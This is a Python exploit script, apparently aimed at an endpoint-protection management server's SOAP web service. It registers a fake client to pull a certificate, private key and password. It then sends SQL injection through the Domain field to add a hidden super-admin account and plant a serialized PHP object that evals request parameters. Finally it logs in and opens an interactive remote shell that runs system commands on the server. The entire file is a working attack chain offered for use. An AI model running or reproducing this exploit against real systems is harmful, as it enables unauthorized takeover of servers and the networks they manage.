import base64
import os.path
import random
import re
import secrets
import string

import requests
import urllib3
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def extract_value(xml_string, target_key):
    pattern = rf'<item>\s*<key(?:\s+[^>]*?)?>\s*{re.escape(target_key)}\s*</key>\s*<value(?:\s+[^>]*?)?>\s*(.*?)\s*</value>\s*</item>'
    match = re.search(pattern, xml_string, re.DOTALL)

    if match:
        return match.group(1)
    else:
        return None


def generate_random_string(length=8):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(secrets.choice(characters) for _ in range(length))
    return random_string


def get_cert_key():
    global cert, key, password
    burp0_data = '''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Header/>
      <soap:Body>
        <Register>
          <ip>192.168.1.2</ip>
          <mac>00:1A:2B:3C:4E:5E</mac>
          <name>www.example.com</name>
          <workgroup></workgroup>
          <domain></domain>
          <dcode>defdep</dcode>
          <uniqId></uniqId>
          <serialNumber></serialNumber>
        </Register>
      </soap:Body>
    </soap:Envelope>
    '''
    burp0_headers = {
        "User-Agent": "Mozilla/4001 (Macintosh; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        "Content-Type": "text/xml; charset=utf-8"
    }
    req = requests.post(url + "/wsf/webservice.php", headers=burp0_headers, data=burp0_data, verify=False)
    certificate_value = extract_value(req.text, "certificate")
    data = base64.b64decode(certificate_value).decode('utf-8')
    cert_pattern = r'-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----'
    key_pattern = r'-----BEGIN ENCRYPTED PRIVATE KEY-----(.*?)-----END ENCRYPTED PRIVATE KEY-----'

    cert_match = re.search(cert_pattern, data, re.DOTALL)
    key_match = re.search(key_pattern, data, re.DOTALL)
    if cert_match:
        cert = cert_match.group(0)
        print(f"[+] get cert success")
    else:
        return
    if key_match:
        key = key_match.group(0)
        print(f"[+] get private key success")
    else:
        return
    password = extract_value(req.text, "password")
    print(f"[+] get Password: {password}")
    return cert, key, password


def extract_csrf_token(html_content):
    pattern = r'<input[^>]+name="csrf_token_anon"[^>]+value="([^"]+)"'
    match = re.search(pattern, html_content)
    if match:
        return match.group(1)
    else:
        return None


def exploit():
    cert, key, password = get_cert_key()
    private_key = serialization.load_pem_private_key(
        key.encode(),
        password=str(password).encode('utf-8'),
        backend=default_backend()
    )
    cert_file = "cert.pem"
    if not os.path.exists(cert_file):
        with open(cert_file, "wb+") as f:
            f.write(cert.encode())

    key_file = "key.pem"
    if not os.path.exists(key_file):
        with open(key_file, "wb+") as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))

    cert_path = (cert_file, key_file)
    data = '''<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Header>
            <m:Ping></m:Ping>
          </soap:Header>
          <soap:Body>
            <Ping>
             <unlicensed>1</unlicensed>
             <user>aaaa</user>
             <localtime>2024-09-11 14:30:00</localtime>
             <clientversion>9999</clientversion>
             <hash_settings></hash_settings>
             <hash_rights></hash_rights>
             <hash_logs></hash_logs>
             <hash_qlogs></hash_qlogs>
             <machinename></machinename>
             <hash_wlist></hash_wlist>
             <macAddress></macAddress>
             <workgroup></workgroup>
             <domain></domain>
             <hash_cf_policies></hash_cf_policies>
             <hash_dr_policies></hash_dr_policies>
             <hash_dr_objects></hash_dr_objects>
             <additionalData></additionalData>
             <ts_users>
                    <User>
                       <UserName>aaaa</UserName>
                       <Domain>{}</Domain>
                       <UserSid>S-1-5-21-3623811015-3361044348-30300820-1013</UserSid>
                    </User>
             </ts_users>
             <hash_network_share_whitelist></hash_network_share_whitelist>
             <sn></sn>
             <uniqueId></uniqueId>
            </Ping>
          </soap:Body>
        </soap:Envelope>
            '''
    burp0_headers = {
        "User-Agent": "Mozilla/4001 (xx; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        "Content-Type": "text/xml; charset=utf-8"
    }
    data1 = data.format("test")
    rr = requests.post(url + '/ws/webservice.php',
                  cert=cert_path, verify=False, headers=burp0_headers, data=data1)
    # print(rr.text)
    adoperation_id = random.randint(1, 10000000)
    admin_user = generate_random_string(8)
    data2 = data.format(
        f"' WHERE id = 1111;INSERT INTO sf_guard_user (username,algorithm,salt,password, is_active, is_super_admin) VALUES ('{admin_user}','sha1','5876cc89b07bffa4c1e92f6950ebd30d','eb6d34273c51ce8703bc9f5a6aeacafb19ac6105',1,1);INSERT INTO adoperation (id,action) VALUES ({adoperation_id},1);INSERT INTO adoperation_log (adoperation_id, message_svalues) VALUES ({adoperation_id}, 0x613a323a7b693a303b4f3a393a2243727970745f525341223a303a7b7d693a313b4f3a383a224e65745f53534831223a323a7b733a363a226269746d6170223b693a313b733a363a2263727970746f223b4f3a393a2243727970745f444553223a363a7b733a31303a22626c6f636b5f73697a65223b733a35313a2231297b7d7d7d3b206f625f636c65616e28293b6576616c28245f524551554553545b27636d64275d293b64696528293b203f3e223b733a31323a22696e6c696e655f6372797074223b4e3b733a31363a227573655f696e6c696e655f6372797074223b693a313b733a373a226368616e676564223b693a313b733a363a22656e67696e65223b733a353a227878787878223b733a343a226d6f6465223b693a313b7d7d7d);#")
    print(f'[*] try to inject serialize data and add admin users: {admin_user}:epp2011')
    rr = requests.post(url + '/ws/webservice.php',
                  cert=cert_path, verify=False, headers=burp0_headers, data=data2)
    # print(rr.text)
    burp1_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
        "Referer": url + "/index.php",
        'Accept-Encoding': 'identity',
        "Connection": "close"
    }
    session = requests.session()
    resp = session.get(url + "/index.php/", verify=False, headers=burp1_headers, proxies=proxies)
    login_data = {
        "csrf_token_anon": (None, extract_csrf_token(resp.text)),
        "username": (None, admin_user),
        "password": (None, "epp2011"),
        "useGoogleAuth": (None, "0"),
        "code": (None, "")
    }
    r = session.post(url + "/index.php/login", headers=burp1_headers, files=login_data, verify=False, proxies=proxies,
                     allow_redirects=False)
    if r.status_code == 302 and 'ratool=' in r.headers["Set-Cookie"]:
        print(f"[+] exploit success. please input cmd:")
        while True:
            cmd = input("> ")
            if cmd == "exit":
                break
            resp = session.get(
                url + f'/index.php/ad_log/list?id={adoperation_id}&cmd=ob_end_flush();system($_GET["c"]);exit();&c=' + cmd,
                verify=False, headers=burp1_headers, proxies=proxies)
            print(resp.text)
    else:
        print("[x] login failed!")


if __name__ == '__main__':
    url = "https://192.168.88.201"
    proxies = {
        # "http": "http://127.0.0.1:8080",
        # "https": "http://127.0.0.1:8080",
    }
    exploit()
